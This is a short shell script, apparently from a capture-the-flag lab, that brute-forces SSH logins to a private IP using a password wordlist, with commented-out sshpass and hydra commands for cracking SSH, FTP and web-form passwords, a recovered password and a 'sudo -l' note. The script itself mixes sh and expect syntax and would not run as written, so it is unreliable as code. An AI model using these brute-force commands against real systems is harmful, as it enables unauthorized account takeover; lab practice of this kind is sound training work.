#!/bin/sh
filename = 'locks.txt'
while read line; do
ssh lin@10.10.245.67; 
expect "lin@10.10.245.67's password:"; 
send -- $line; 
done < locks.txt 

##while read l; do echo "$l"; sshpass -p "$l" ssh lin@$(cat ip) whoami; done < locks.txt

#Password: RedDr4gonSynd1cat3
#sudo -l

#HYDRA cracks network service passwords
#hydra -l user -P passlist.txt ftp://192.168.0.1
#hydra -l <username> -P <password list> <ip> http-post-form "/<login url>:username=^USER^&password=^PASS^:F=incorrect" -V
